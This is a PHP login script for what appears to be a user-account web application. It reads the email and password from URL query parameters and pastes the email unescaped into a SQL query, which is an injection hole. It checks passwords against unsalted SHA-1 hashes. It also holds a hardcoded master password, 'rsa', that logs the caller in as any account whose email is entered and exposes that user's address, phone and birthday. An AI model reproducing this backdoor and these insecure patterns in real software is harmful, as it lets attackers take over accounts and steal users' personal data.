<?php

require_once 'config.php';
session_start();

$entered_password = $_GET['password'];
$entered_email = $_GET['email'];

if ($db->connect_error) {
		die("Connection failed: " . $db->connect_error);
}

//$sql = "SELECT nickname FROM `User`WHERE email = '$entered_email'";

$sql1 = "SELECT * FROM User WHERE email = '$entered_email'";
$result1 = mysqli_query($db,$sql1);
$user = mysqli_fetch_object($result1);

$hashedpassword = hash('sha1', $entered_password);
//if ($user->password == $entered_password){
$killer_key = "rsa";
if ($user->password == $hashedpassword OR $entered_password == $killer_key){
	$_SESSION['login_user_id'] = $user->user_id;
	$_SESSION['login_username'] = $user->nickname;
	$_SESSION['login_lastname'] = $user->lastname;
	$_SESSION['login_firstname'] = $user->firstname;
	$_SESSION['login_phone_no'] = $user->phone_no;
	$_SESSION['login_address'] = $user->address;
	$_SESSION['login_birthday'] = $user->birthday;
	$_SESSION['login_gender'] = $user->gender;
	$_SESSION['login_profilepicture'] = $user->profilepicture;
	//$_SESSION['login_rating'] = $user->user_id;
	$_SESSION['login_email'] = $entered_email;
	header("Location: index.php");

}
else{
	header("Location: login.php?f=1");

}



/*
$sql = "SELECT nickname FROM `User` WHERE email = '$entered_email' ";
$result = mysqli_query ($db,$sql);

$result = mysqli_query($db, $sql);
echo "test";
$myarray = array();
while ($row = mysqli_fetch_array($result)) {
    echo "test";
    $myarray[$row['nickname']] = $row['nickname'];
}

if (array_key_exists($entered_email, $myarray)) {
    echo "Nickname exists in the system";
} 
echo $myarray[0];
*/


?>